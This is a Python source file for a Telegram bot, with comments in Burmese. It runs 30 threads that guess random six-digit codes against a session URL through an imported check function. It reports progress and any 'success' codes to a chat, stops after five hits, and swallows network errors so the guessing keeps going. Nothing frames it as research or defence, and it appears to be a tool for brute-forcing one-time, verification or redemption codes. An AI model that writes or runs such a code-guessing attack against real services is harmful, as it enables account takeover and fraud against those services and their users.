import telebot
import random
import threading
import time
from concurrent.futures import ThreadPoolExecutor
from url import check_single_code

BOT_TOKEN = ''
bot = telebot.TeleBot(BOT_TOKEN)

stop_event = threading.Event()

def start_fast_scan(chat_id, message_id, sessionurl):
    stop_event.clear()
    success_count = 0
    scanned_count = 0  # စစ်ပြီးသားအရေအတွက် မှတ်ရန်
    tested_codes = set()
    
    # Progress ကို နောက်ဆုံး update လုပ်ခဲ့တဲ့အချိန် (Spam မဖြစ်အောင်)
    last_update_time = time.time()

    def worker(code):
        nonlocal success_count, scanned_count, last_update_time
        if stop_event.is_set(): return
        
        try:
            # ၁။ Error Handling: Network error တက်ရင် ရပ်မသွားစေရန်
            response = check_single_code(sessionurl, code)
            
            scanned_count += 1
            
            # ၂။ Logging & Status: ၃ စက္ကန့်တိုင်းမှ တစ်ခါ Progress Update လုပ်ပေးမည်
            if time.time() - last_update_time > 3:
                bot.edit_message_text(
                    chat_id=chat_id, 
                    message_id=message_id, 
                    text=f"🚀 Scanning... စစ်ဆေးပြီးအရေအတွက်: {scanned_count} ခု\n✅ တွေ့ရှိချက်: {success_count} ခု"
                )
                last_update_time = time.time()
            
            if "success_text" in response: 
                success_count += 1
                bot.send_message(chat_id, f"✅ Success Code တွေ့ပြီ: {code} ({success_count}/5)")
                if success_count >= 5:
                    stop_event.set()
                    
        except Exception as e:
            # Network error သို့မဟုတ် အခြား error တက်ပါက လျစ်လျူရှုပြီး ဆက်စစ်မည်
            pass

    with ThreadPoolExecutor(max_workers=30) as executor:
        while success_count < 5 and not stop_event.is_set():
            code = f"{random.randint(0, 999999):06d}"
            
            if code not in tested_codes:
                tested_codes.add(code)
                executor.submit(worker, code)
        
        # Scan ပြီးဆုံးသွားသည့်အခါ နောက်ဆုံးအခြေအနေကို ပြသပေးခြင်း
        bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=f"🏁 Scan ပြီးဆုံးပါပြီ။\nစုစုပေါင်းစစ်ဆေးပြီး: {scanned_count} ခု\nSuccess Code: {success_count} ခု")

# (ကျန်ရှိသော bot handler များကို အရင်ကအတိုင်း ထည့်ပါ)
print("Bot is ready...")
bot.polling()
